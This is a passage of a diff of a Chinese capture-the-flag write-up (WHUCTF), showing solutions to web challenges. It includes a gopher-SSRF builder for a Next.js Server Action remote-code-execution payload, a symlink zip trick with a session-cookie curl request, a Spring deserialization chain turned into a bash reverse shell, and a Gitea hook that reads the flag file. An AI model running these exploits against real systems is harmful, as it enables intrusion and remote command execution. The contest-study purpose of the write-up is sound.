class="hljs-string">"{digest:'NEXT_REDIRECT;push;/' + encodeURIComponent(o) + ';307;'});"</span><br>    )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_body</span>(<span class="hljs-params">boundary: <span class="hljs-built_in">str</span>, cmd: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    obj0 = {<br>        <span class="hljs-string">"then"</span>: <span class="hljs-string">"$1:__proto__:then"</span>,<br>        <span class="hljs-string">"status"</span>: <span class="hljs-string">"resolved_model"</span>,<br>        <span class="hljs-string">"reason"</span>: -<span class="hljs-number">1</span>,<br>        <span class="hljs-string">"value"</span>: <span class="hljs-string">"{\"then\":\"$B0\"}"</span>,<br>        <span class="hljs-string">"_response"</span>: {<br>            <span class="hljs-string">"_prefix"</span>: build_js_payload(cmd),<br>            <span class="hljs-string">"_chunks"</span>: <span class="hljs-string">"$Q2"</span>,<br>            <span class="hljs-string">"_formData"</span>: {<span class="hljs-string">"get"</span>: <span class="hljs-string">"$1:constructor:constructor"</span>},<br>        },<br>    }<br><br>    fields = [<br>        (<span class="hljs-string">"0"</span>, json.dumps(obj0, separators=(<span class="hljs-string">","</span>, <span class="hljs-string">":"</span>))),<br>        (<span class="hljs-string">"1"</span>, <span class="hljs-string">"\"$@0\""</span>),<br>        (<span class="hljs-string">"2"</span>, <span class="hljs-string">"[]"</span>),<br>    ]<br><br>    parts = []<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> fields:<br>        parts.append(<span class="hljs-string">f"--<span class="hljs-subst">{boundary}</span>\r\n"</span>)<br>        parts.append(<span class="hljs-string">f"Content-Disposition: form-data; name=\"<span class="hljs-subst">{k}</span>\"\r\n\r\n"</span>)<br>        parts.append(<span class="hljs-string">f"<span class="hljs-subst">{v}</span>\r\n"</span>)<br>    parts.append(<span class="hljs-string">f"--<span class="hljs-subst">{boundary}</span>--\r\n"</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>.join(parts)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_request</span>(<span class="hljs-params">host: <span class="hljs-built_in">str</span>, path: <span class="hljs-built_in">str</span>, boundary: <span class="hljs-built_in">str</span>, body: <span class="hljs-built_in">str</span>, next_action: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">return</span> (<br>        <span class="hljs-string">f"POST <span class="hljs-subst">{path}</span> HTTP/1.1\r\n"</span><br>        <span class="hljs-string">f"Host: <span class="hljs-subst">{host}</span>\r\n"</span><br>        <span class="hljs-string">f"Next-Action: <span class="hljs-subst">{next_action}</span>\r\n"</span><br>        <span class="hljs-string">f"Content-Type: multipart/form-data; boundary=<span class="hljs-subst">{boundary}</span>\r\n"</span><br>        <span class="hljs-string">f"Content-Length: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(body.encode())}</span>\r\n"</span><br>        <span class="hljs-string">"Connection: close\r\n\r\n"</span><br>        <span class="hljs-string">f"<span class="hljs-subst">{body}</span>"</span><br>    )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_gopher_url</span>(<span class="hljs-params">host: <span class="hljs-built_in">str</span>, port: <span class="hljs-built_in">int</span>, req: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f"gopher://<span class="hljs-subst">{host}</span>:<span class="hljs-subst">{port}</span>/_"</span> + quote(req, safe=<span class="hljs-string">""</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_args</span>() -&gt; argparse.Namespace:<br>    parser = argparse.ArgumentParser(<br>        description=<span class="hljs-string">"Build gopher SSRF payload for Next/React multipart Server Action POST"</span><br>    )<br>    parser.add_argument(<span class="hljs-string">"--host"</span>, default=<span class="hljs-string">"127.0.0.1"</span>)<br>    parser.add_argument(<span class="hljs-string">"--port"</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">80</span>)<br>    parser.add_argument(<span class="hljs-string">"--path"</span>, default=<span class="hljs-string">"/"</span>)<br>    parser.add_argument(<span class="hljs-string">"--boundary"</span>, default=<span class="hljs-string">"----x"</span>)<br>    parser.add_argument(<span class="hljs-string">"--next-action"</span>, dest=<span class="hljs-string">"next_action"</span>, default=<span class="hljs-string">"x"</span>)<br>    parser.add_argument(<span class="hljs-string">"--cmd"</span>, default=<span class="hljs-string">"id"</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">"RCE command, test with id then switch to cat /flag"</span>)<br>    parser.add_argument(<br>        <span class="hljs-string">"--all-paths"</span>,<br>        action=<span class="hljs-string">"store_true"</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">"print payloads for /, /_next/action, /flag, /api/flag"</span>,<br>    )<br>    <span class="hljs-keyword">return</span> parser.parse_args()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>() -&gt; <span class="hljs-literal">None</span>:<br>    args = parse_args()<br><br>    paths = [args.path]<br>    <span class="hljs-keyword">if</span> args.all_paths:<br>        paths = [<span class="hljs-string">"/"</span>, <span class="hljs-string">"/_next/action"</span>, <span class="hljs-string">"/flag"</span>, <span class="hljs-string">"/api/flag"</span>]<br><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> paths:<br>        body = build_body(args.boundary, args.cmd)<br>        req = build_request(args.host, p, args.boundary, body, args.next_action)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"# path=<span class="hljs-subst">{p}</span> cmd=<span class="hljs-subst">{args.cmd}</span>"</span>)<br>        <span class="hljs-built_in">print</span>(build_gopher_url(args.host, args.port, req))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_js_payload</span>(<span class="params">cmd: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment"># Use NEXT_REDIRECT digest to exfiltrate command output in response</span></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="string">"var o=process.mainModule.require('child_process').execSync("</span></span><br><span class="line">        + json.dumps(cmd)</span><br><span class="line">        + <span class="string">").toString().trim();"</span></span><br><span class="line">          <span class="string">"throw Object.assign(new Error('NEXT_REDIRECT'),"</span></span><br><span class="line">          <span class="string">"{digest:'NEXT_REDIRECT;push;/' + encodeURIComponent(o) + ';307;'});"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_body</span>(<span class="params">boundary: <span class="built_in">str</span>, cmd: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    obj0 = {</span><br><span class="line">        <span class="string">"then"</span>: <span class="string">"$1:__proto__:then"</span>,</span><br><span class="line">        <span class="string">"status"</span>: <span class="string">"resolved_model"</span>,</span><br><span class="line">        <span class="string">"reason"</span>: -<span class="number">1</span>,</span><br><span class="line">        <span class="string">"value"</span>: <span class="string">"{\"then\":\"$B0\"}"</span>,</span><br><span class="line">        <span class="string">"_response"</span>: {</span><br><span class="line">            <span class="string">"_prefix"</span>: build_js_payload(cmd),</span><br><span class="line">            <span class="string">"_chunks"</span>: <span class="string">"$Q2"</span>,</span><br><span class="line">            <span class="string">"_formData"</span>: {<span class="string">"get"</span>: <span class="string">"$1:constructor:constructor"</span>},</span><br><span class="line">        },</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    fields = [</span><br><span class="line">        (<span class="string">"0"</span>, json.dumps(obj0, separators=(<span class="string">","</span>, <span class="string">":"</span>))),</span><br><span class="line">        (<span class="string">"1"</span>, <span class="string">"\"$@0\""</span>),</span><br><span class="line">        (<span class="string">"2"</span>, <span class="string">"[]"</span>),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    parts = []</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> fields:</span><br><span class="line">        parts.append(<span class="string">f"--<span class="subst">{boundary}</span>\r\n"</span>)</span><br><span class="line">        parts.append(<span class="string">f"Content-Disposition: form-data; name=\"<span class="subst">{k}</span>\"\r\n\r\n"</span>)</span><br><span class="line">        parts.append(<span class="string">f"<span class="subst">{v}</span>\r\n"</span>)</span><br><span class="line">    parts.append(<span class="string">f"--<span class="subst">{boundary}</span>--\r\n"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join(parts)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_request</span>(<span class="params">host: <span class="built_in">str</span>, path: <span class="built_in">str</span>, boundary: <span class="built_in">str</span>, body: <span class="built_in">str</span>, next_action: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="string">f"POST <span class="subst">{path}</span> HTTP/1.1\r\n"</span></span><br><span class="line">        <span class="string">f"Host: <span class="subst">{host}</span>\r\n"</span></span><br><span class="line">        <span class="string">f"Next-Action: <span class="subst">{next_action}</span>\r\n"</span></span><br><span class="line">        <span class="string">f"Content-Type: multipart/form-data; boundary=<span class="subst">{boundary}</span>\r\n"</span></span><br><span class="line">        <span class="string">f"Content-Length: <span class="subst">{<span class="built_in">len</span>(body.encode())}</span>\r\n"</span></span><br><span class="line">        <span class="string">"Connection: close\r\n\r\n"</span></span><br><span class="line">        <span class="string">f"<span class="subst">{body}</span>"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_gopher_url</span>(<span class="params">host: <span class="built_in">str</span>, port: <span class="built_in">int</span>, req: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f"gopher://<span class="subst">{host}</span>:<span class="subst">{port}</span>/_"</span> + quote(req, safe=<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_args</span>() -&gt; argparse.Namespace:</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">"Build gopher SSRF payload for Next/React multipart Server Action POST"</span></span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(<span class="string">"--host"</span>, default=<span class="string">"127.0.0.1"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"--port"</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">80</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"--path"</span>, default=<span class="string">"/"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"--boundary"</span>, default=<span class="string">"----x"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"--next-action"</span>, dest=<span class="string">"next_action"</span>, default=<span class="string">"x"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"--cmd"</span>, default=<span class="string">"id"</span>, <span class="built_in">help</span>=<span class="string">"RCE command, test with id then switch to cat /flag"</span>)</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">"--all-paths"</span>,</span><br><span class="line">        action=<span class="string">"store_true"</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">"print payloads for /, /_next/action, /flag, /api/flag"</span>,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    args = parse_args()</span><br><span class="line"></span><br><span class="line">    paths = [args.path]</span><br><span class="line">    <span class="keyword">if</span> args.all_paths:</span><br><span class="line">        paths = [<span class="string">"/"</span>, <span class="string">"/_next/action"</span>, <span class="string">"/flag"</span>, <span class="string">"/api/flag"</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> paths:</span><br><span class="line">        body = build_body(args.boundary, args.cmd)</span><br><span class="line">        req = build_request(args.host, p, args.boundary, body, args.next_action)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"# path=<span class="subst">{p}</span> cmd=<span class="subst">{args.cmd}</span>"</span>)</span><br><span class="line">        <span class="built_in">print</span>(build_gopher_url(args.host, args.port, req))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
 
 <p>手一直在抖看其他web手都出其他题目了我还在这题上面卡</p>
 <p>WHUCTF{WeIcom3_7o_7h3_HEIL_7bbc86423c8c}</p>
@@ -415,9 +699,9 @@ mjx-container[display="true"] + br {
 <p>然后进入admin账号利用zip上传解压图片，但是很明显flag被ban了，但是根据读源码的提示，是可以被html的标签带出资源的</p>
 <p>在 Linux系统中，软链接（Symbolic Link） 是一种特殊的文件或目录，它指向另一个文件或目录。通过软链接，可以方便地访问目标文件或目录，而无需复制实际内容。</p>
 <p>所以</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Plain">ln -s /flag flag_link.jpg（🔗向flag）<br>zip --symlinks exploit.zip flag_link.jpg<br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /flag flag_link.jpg（🔗向flag）</span><br><span class="line">zip --symlinks exploit.zip flag_link.jpg</span><br></pre></td></tr></table></figure></div>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Plain">curl -s -b 'session=.eJwtj00OgjAUhO_yVpoQobSlFg9DXn_QKhRCiy4Id7dadpNvJjOZDdZgl84ZaOsi6-BxDo8pQrsBvjHiAi2UIWJ0uswglP-ksT2uQ-wyvDznOxSg3JTyYbB2PjXV-ZaQHdENCSZ5DHmnXx5Hm-GMIXymJVlgiOaUVpwozowy-sp6KitJTc9qRRtBKtEIqrS8okCUvOEGmZZW1UxoJCy1LdPw60UzOg_50zFFYN-_SxxLOw.aeRTcQ.m_cXewT2kf6cY5HIWnFmgkYBTis' \<br>  http://127.0.0.1:43401/images/flag_link.jpg<br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s -b 'session=.eJwtj00OgjAUhO_yVpoQobSlFg9DXn_QKhRCiy4Id7dadpNvJjOZDdZgl84ZaOsi6-BxDo8pQrsBvjHiAi2UIWJ0uswglP-ksT2uQ-wyvDznOxSg3JTyYbB2PjXV-ZaQHdENCSZ5DHmnXx5Hm-GMIXymJVlgiOaUVpwozowy-sp6KitJTc9qRRtBKtEIqrS8okCUvOEGmZZW1UxoJCy1LdPw60UzOg_50zFFYN-_SxxLOw.aeRTcQ.m_cXewT2kf6cY5HIWnFmgkYBTis' \</span><br><span class="line">  http://127.0.0.1:43401/images/flag_link.jpg</span><br></pre></td></tr></table></figure></div>
 
 <p>这里用curl+session是因为我直接访问没看到，所以用session curl带出</p>
 <p>WHUCTF{1eT_uS_0RdeR_A_R46blt_bd35bf401724}</p>
@@ -425,23 +709,23 @@ mjx-container[display="true"] + br {
 <h2 id="Nespresso-solved"><a href="#Nespresso-solved" class="headerlink" title="Nespresso[solved]"></a>Nespresso[solved]</h2><p>将jar包反编译得到一个jar项目，抛开spring框架查看源码</p>
 <p>1.攻击点在/serve的payload参数，base64字节流通过解码触发readobject();</p>
 <p>2.继续看发现有黑名单限制：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">(<span class="hljs-title class_">CoffeeObjectInputStream</span>.<span class="hljs-property">BLACKLIST</span> = (<span class="hljs-title class_">ArrayList</span>&lt;<span class="hljs-title class_">String</span>&gt;)<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>()).<span class="hljs-title function_">add</span>((<span class="hljs-title class_">Object</span>)<span class="hljs-string">"java.swing"</span>);<br>        <span class="hljs-title class_">CoffeeObjectInputStream</span>.<span class="hljs-property">BLACKLIST</span>.<span class="hljs-title function_">add</span>((<span class="hljs-title class_">Object</span>)<span class="hljs-string">"java.security"</span>);<br>        <span class="hljs-title class_">CoffeeObjectInputStream</span>.<span class="hljs-property">BLACKLIST</span>.<span class="hljs-title function_">add</span>((<span class="hljs-title class_">Object</span>)<span class="hljs-string">"org.spingframework.aop.target"</span>);<br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="title class_">CoffeeObjectInputStream</span>.<span class="property">BLACKLIST</span> = (<span class="title class_">ArrayList</span>&lt;<span class="title class_">String</span>&gt;)<span class="keyword">new</span> <span class="title class_">ArrayList</span>()).<span class="title function_">add</span>((<span class="title class_">Object</span>)<span class="string">"java.swing"</span>);</span><br><span class="line">        <span class="title class_">CoffeeObjectInputStream</span>.<span class="property">BLACKLIST</span>.<span class="title function_">add</span>((<span class="title class_">Object</span>)<span class="string">"java.security"</span>);</span><br><span class="line">        <span class="title class_">CoffeeObjectInputStream</span>.<span class="property">BLACKLIST</span>.<span class="title function_">add</span>((<span class="title class_">Object</span>)<span class="string">"org.spingframework.aop.target"</span>);</span><br></pre></td></tr></table></figure></div>
 
 <p>org.spingframework.aop.target</p>
 <p>我们不难发现，这个springframework写错了，写成了sping,好的所以应该使用spring链</p>
 <p>根据hint:题目环境为JDK17，本题出网，无需内存马</p>
 <p>于是进行一些信息搜集</p>
 <p>只要在浏览器中输入：JDK17spring反序列化链，第一篇就是参考blog（（（</p>
-<p><a target="_blank" rel="noopener" href="https://curlysean.github.io/2025/08/31/%E9%AB%98%E7%89%88%E6%9C%ACJDKSpring%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/">https://curlysean.github.io/2025/08/31/%E9%AB%98%E7%89%88%E6%9C%ACJDKSpring%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://curlysean.github.io/2025/08/31/%E9%AB%98%E7%89%88%E6%9C%ACJDKSpring%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/">https://curlysean.github.io/2025/08/31/%E9%AB%98%E7%89%88%E6%9C%ACJDKSpring%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 <p>但是注意到出网，所以需要一些反弹shell的工作，我们可以把原blog里的poc的string block调整为：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> <span class="hljs-string">"127.0.0.1"</span>;    <span class="hljs-comment">//  IP</span><br><span class="hljs-type">String</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-string">"4444"</span>;            <span class="hljs-comment">//端口</span><br>        <br><span class="hljs-comment">// 构造命令数组：/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/IP/port 0&gt;&amp;1"</span><br><span class="hljs-type">String</span> <span class="hljs-variable">block</span> <span class="hljs-operator">=</span> <span class="hljs-string">"String[] cmd = {\"/bin/bash\", \"-c\", \"/bin/bash -i &gt;&amp; /dev/tcp/"</span> + ip + <span class="hljs-string">"/"</span> + port + <span class="hljs-string">" 0&gt;&amp;1\"};"</span> +<br>                       <span class="hljs-string">"Runtime.getRuntime().exec(cmd);"</span><br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> <span class="string">"127.0.0.1"</span>;    <span class="comment">//  IP</span></span><br><span class="line"><span class="type">String</span> <span class="variable">port</span> <span class="operator">=</span> <span class="string">"4444"</span>;            <span class="comment">//端口</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">// 构造命令数组：/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/IP/port 0&gt;&amp;1"</span></span><br><span class="line"><span class="type">String</span> <span class="variable">block</span> <span class="operator">=</span> <span class="string">"String[] cmd = {\"/bin/bash\", \"-c\", \"/bin/bash -i &gt;&amp; /dev/tcp/"</span> + ip + <span class="string">"/"</span> + port + <span class="string">" 0&gt;&amp;1\"};"</span> +</span><br><span class="line">                       <span class="string">"Runtime.getRuntime().exec(cmd);"</span></span><br></pre></td></tr></table></figure></div>
 
 <p>需要把本机的jdk版本切换为17,然后进行编译运行，以及要下载一堆jar…….</p>
 <p>最终通过反弹shell获取flag，虽然我本地没通但是出题人那边通了，也不知道为什么……交流后还是把分给我了，感到很内疚…….</p>
 <h2 id="gitea"><a href="#gitea" class="headerlink" title="gitea"></a>gitea</h2><p>gitea1.25版本的容器，一直没什么思路，赛后和一些师傅们交流发现是个0day的洞。<br>根据hint先进行登陆，然后通过/sec/sec/issues/new?template=README.md越权读取，之后继续读取admin账号密码进行登陆。<br>接下来是利用gitea的hook漏洞,将post-receive钩子修改如下（这是AI搓的果咩</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><br><span class="hljs-comment"># 读取推送信息：oldrev, newrev, 分支名（例如 refs/heads/main）</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> oldrev newrev refname; <span class="hljs-keyword">do</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$refname</span>"</span> = <span class="hljs-string">"refs/heads/main"</span> ] || [ <span class="hljs-string">"<span class="hljs-variable">$refname</span>"</span> = <span class="hljs-string">"refs/heads/master"</span> ]; <span class="hljs-keyword">then</span><br><br>TARGET_BRANCH=<span class="hljs-variable">$refname</span><br><br>NEWREV=<span class="hljs-variable">$newrev</span><br><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">done</span><br><br>  <br><br><span class="hljs-comment"># 如果标准输入无数据（极少情况），手动指定分支和当前 HEAD 作为新提交</span><br><br><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">"<span class="hljs-variable">$TARGET_BRANCH</span>"</span> ]; <span class="hljs-keyword">then</span><br><br>TARGET_BRANCH=<span class="hljs-string">"refs/heads/main"</span><br><br>NEWREV=$(git rev-parse HEAD)<br><br><span class="hljs-keyword">fi</span><br><br>  <br><br><span class="hljs-comment"># 进入 bare 仓库目录</span><br><br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$GIT_DIR</span><br><br>  <br><br><span class="hljs-comment"># === 核心：搜索并读取 flag ===</span><br><br>FLAG=$(<span class="hljs-built_in">cat</span> /flag 2&gt;/dev/null || <span class="hljs-built_in">cat</span> /flag.txt 2&gt;/dev/null || \<br><br><span class="hljs-built_in">cat</span> /app/flag 2&gt;/dev/null || \<br><br><span class="hljs-built_in">printenv</span> FLAG 2&gt;/dev/null || \<br><br>find / -name <span class="hljs-string">"flag*"</span> -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> {} \; 2&gt;/dev/null | <span class="hljs-built_in">head</span> -c 1000)<br><br><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">"<span class="hljs-variable">$FLAG</span>"</span> ]; <span class="hljs-keyword">then</span><br><br>FLAG=<span class="hljs-string">"flag_not_found_but_hook_worked"</span><br><br><span class="hljs-keyword">fi</span><br><br>  <br><br><span class="hljs-comment"># === 将 flag 写入仓库文件（在 bare 仓库中） ===</span><br><br><span class="hljs-comment"># 1. 将 flag 内容存入 Git 对象数据库，得到 blob 哈希</span><br><br>BLOB=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$FLAG</span>"</span> | git hash-object -w --stdin)<br><br>  <br><br><span class="hljs-comment"># 2. 用这个 blob 构建一个临时树对象，内容为 "flag.txt" 文件</span><br><br>TREE=$(<span class="hljs-built_in">printf</span> <span class="hljs-string">"100644 blob %s\tflag.txt\n"</span> <span class="hljs-string">"<span class="hljs-variable">$BLOB</span>"</span> | git mktree)<br><br>  <br><br><span class="hljs-comment"># 3. 基于临时树对象创建新提交，父提交为 NEWREV（刚推送成功的提交）</span><br><br>COMMIT=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">"add flag"</span> | git commit-tree <span class="hljs-variable">$TREE</span> -p <span class="hljs-variable">$NEWREV</span>)<br><br>  <br><br><span class="hljs-comment"># 4. 将目标分支的引用指针强制更新到新提交（相当于在 main 上追加了包含 flag.txt 的提交）</span><br><br>git update-ref <span class="hljs-variable">$TARGET_BRANCH</span> <span 